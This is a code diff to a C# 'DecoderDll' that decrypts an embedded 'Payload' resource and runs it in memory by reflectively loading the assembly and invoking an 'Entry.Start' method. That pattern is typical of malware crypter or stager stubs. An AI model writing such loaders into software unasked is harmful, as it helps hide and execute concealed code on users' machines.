@@ -5,6 +5,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using System.Reflection;
 
 namespace DecoderDll
 {
@@ -35,17 +36,21 @@ namespace DecoderDll
             return decryptedBytes;
         }
 
-        static void Start()
+        public static void Start()
         {
 #if DEBUG
             Console.WriteLine("Running DecoderDll.");
-#endif 
+#endif
             InitDecoder();
             var b64 = Encoding.UTF8.GetString(Properties.Resources.Payload);
             var asm = Decrypt(Convert.FromBase64String(b64));
 
-                var assembly = System.Reflection.Assembly.Load(asm);
-                assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
+                //var assembly = System.Reflection.Assembly.Load(asm);
+                //assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
+
+            var assembly = System.Reflection.Assembly.Load(asm);
+            var method = assembly.GetTypes().First(t => t.Name ==  "Entry").GetMethod("Start", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
+            method.Invoke(null, new object[] { });
 
         }
     }
